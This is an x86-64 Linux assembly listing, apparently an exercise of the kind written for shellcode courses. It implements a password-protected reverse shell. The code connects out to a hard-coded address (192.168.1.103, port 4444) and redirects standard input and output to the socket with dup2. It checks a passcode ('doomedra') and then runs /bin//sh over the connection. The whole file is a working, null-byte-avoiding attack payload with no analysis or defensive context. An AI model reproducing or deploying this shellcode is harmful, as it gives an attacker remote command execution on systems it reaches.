global _start
section .text

_start:

   ;socket syscall
	xor esi, esi
	mul rsi
	add al, 0x29
	xor edi, edi
	add dil, 0x2
	add sil, 0x1
   syscall
   
	push rax
	pop rdi
	
	mov r9, 0x6701a8c05c112224
	sub r9w, 0x2222
	push r9
   
   
	xor esi, esi
	mul rsi
	add al, 0x2a
	add dl, 0x10
	mov rsi, rsp   ; pointer    
   syscall

	push byte 0x3; counter 
	pop rsi

dup2_loop:
	xor eax, eax
	add al, 0x21
	dec rsi
	syscall
   jnz dup2_loop ; jump if not 0

   ;read buffer
	mov rdi, rax ; socket
	xor eax, eax
	cdq
	push rax 
	push rdx 
   lea rsi, [rsp-0x10] ; 16 bytes from buf
	push 0x10
	pop rdx
   syscall
   
   ;test passcode
   mov rax, 0x617264656d6f6f64 ; passcode 'doomedra'[::-1].encode('hex')
   push rdi                    ; save the socket
   lea rdi, [rsi]              ; load string from address
   scasq                       ; compare
   jz accepted_passwd          ; jump if equal
   
   ;exit if different :P
   push byte 0x3c 
   pop rax
   syscall

accepted_passwd:
   
   ;execve
   pop rdi; socket
   xor eax, eax
   mov rbx, 0x68732f2f6e69622f ;/bin//sh in reverse
   push rbx
   mov rdi, rsp
   push rax
   mov rdx, rsp
   push rdi 
   mov rsi, rsp
   add al, 0x3b
   syscall
